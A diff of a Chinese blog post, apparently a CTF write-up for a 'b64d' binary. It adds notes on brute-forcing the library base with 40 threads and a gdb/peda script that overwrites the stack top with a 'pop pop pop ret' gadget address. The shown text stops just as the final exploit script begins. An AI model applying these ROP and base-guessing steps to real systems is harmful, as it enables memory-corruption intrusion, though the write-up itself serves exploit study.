@@ -67,9 +67,32 @@ tags:
  - 同时开启了40个线程，用并发加快命中概率
  - 每次运行时，先读取 '/proc/pid/maps' 文件，检查so库加载基址是否为 0xfe0000，如果不是则退出，缩短了单个程序运行时间
      ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-10-01-b64d/5.png)
-        最终跑出来的时间还是和人品有关系，但在40个线程的情况下，最多用时10分钟也都能跑出来了。
+        如上图所示，40个线程基本已经达到我虚拟机的CPU极限了。最终跑出来的时间还是和人品有关系，但在40个线程的情况下，最多用时10分钟也都能跑出来了。
 
 ### 五. 利用代码
+
+>编写gdb脚本辅助调试
+
+为了调试在第一次ret成功覆盖为'pop pop pop ret'地址后续的利用过程，不得不每次都先计算出so库基址偏移0x202e3处的地址，再将ret地址数据覆盖为此地址。这样的工作可以通过编写gdb脚本来自动化完成
+
+```python
+python 
+so_start_addr = peda.get_vmmap('/lib/x86_64-linux-gnu/libc-2.23.so')[0][0]
+peda.execute('set $so_start='+hex(so_start_addr))
+end
+
+define ppp
+set *(long long *)$rsp = $so_start + 0x202e3
+end
+
+source aa
+```
+解释：
+      1. peda插件是python实现的，因此通过python的支持，获取so库基址
+      2. 自定义gdb命令ppp，该命令的作用是修改栈顶位置为计算出来的'pppr'的gadget地址
+      3. source aa 是将断点信息文件source进来
+
+>最终exp
 ```python
 from pwn import *
 import base64
